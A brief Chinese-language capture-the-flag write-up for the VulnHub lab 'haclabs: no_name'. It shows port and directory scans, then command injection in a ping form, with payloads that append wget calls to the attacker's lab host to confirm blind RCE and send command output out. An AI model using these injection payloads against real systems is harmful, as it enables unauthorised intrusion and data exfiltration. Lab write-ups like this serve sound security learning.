# haclabs: no_name

2024-5-25 https://www.vulnhub.com/entry/haclabs-no_name,429/

difficulty: Beginner/intermediate

## IP

192.168.5.29

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

gobuster 得到 2 个页面链接：

```
http://192.168.5.29/index.php
http://192.168.5.29/admin
```

/admin 打不开。

/index.php 是一个提交内容页面，输入框中输入一个字符，显示 xxx ping execute，应该是后台在做 ping 操作，这里可能存在 RCE：

先进行下测试，在 kali 上使用 python 搭建一个 web 服务，然后在输入框中输入下面信息，点击提交：

```
127.0.0.1;wget http://192.168.5.3/
```

可以在 python 的控制台中看到，访问记录，证明 RCE 命令能够执行，但是就是没有消息输出，我们可以使用 http 请求把返回结果带出来。

看看目标机器上有没有 nc:

```
127.0.0.1;nc=`which nc`;wget "http://192.168.5.3$nc"
```
